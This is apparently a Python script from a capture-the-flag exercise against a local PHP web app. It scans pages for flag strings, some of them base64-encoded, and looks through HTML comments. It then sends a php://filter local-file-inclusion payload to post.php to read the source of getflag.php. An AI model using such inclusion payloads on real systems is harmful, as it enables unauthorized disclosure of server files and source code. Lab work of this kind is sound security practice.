import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] FINAL comprehensive check...")
print("[+] Checking if FLAG might be embedded in responses I've already seen...")

# Re-check all known files with careful inspection
files_to_recheck = [
    ("/", "Home page"),
    ("/index.php", "Index"),
    ("/about.php", "About"),
    ("/contact.php", "Contact"),
    ("/posts/upload-article.php", "Upload article"),
    ("/posts/uploads/finder.php", "Finder"),
    ("/posts/uploads/getflag.php", "Get flag"),
    ("/posts/uploads/test.php", "Test"),
]

print("\nRechecking all pages for hidden flags...")
for url, desc in files_to_recheck:
    resp = requests.get(f"{base_url}{url}")
    
    # Search for FLAG pattern
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
    
    if flags:
        print(f"\n[!!!] FOUND FLAG in {desc} ({url})!")
        for flag in flags:
            print(f"  {flag}")
    
    # Also check for base64 encoded flags
    import base64
    b64_pattern = r'RkxBR3s[A-Za-z0-9+/=]{20,}'  # FLAG{ in base64 starts with RkxBR3s
    b64_matches = re.findall(b64_pattern, resp.text)
    
    if b64_matches:
        print(f"\n[+] Found potential base64 flag in {desc}:")
        for match in b64_matches:
            try:
                decoded = base64.b64decode(match).decode()
                if 'FLAG{' in decoded:
                    print(f"  Decoded: {decoded}")
            except:
                pass

# Check HTML comments
print("\n[+] Checking for flags in HTML comments...")
for url, desc in files_to_recheck:
    resp = requests.get(f"{base_url}{url}")
    
    # Look for HTML comments
    comments = re.findall(r'<!--(.+?)-->', resp.text, re.DOTALL)
    
    for comment in comments:
        if 'FLAG{' in comment or 'flag' in comment.lower():
            print(f"\n[+] Interesting comment in {desc}:")
            print(f"  {comment[:200]}")

print("\n[+] Let me try accessing getflag.php source one more time with different filter...")
resp = requests.get(f"{base_url}/post.php", params={
    'id': 'php://filter/convert.base64-encode/resource=uploads/getflag.php'
})

if len(resp.text) > 1000:
    # Look for base64
    b64_blocks = re.findall(r'[A-Za-z0-9+/]{200,}={0,2}', resp.text)
    if b64_blocks:
        print(f"Found {len(b64_blocks)} base64 blocks")
        for block in b64_blocks[:3]:
            try:
                decoded = base64.b64decode(block).decode('utf-8', errors='ignore')
                if '<?php' in decoded:
                    print(f"\nDecoded PHP source:")
                    print(decoded[:500])
            except:
                pass

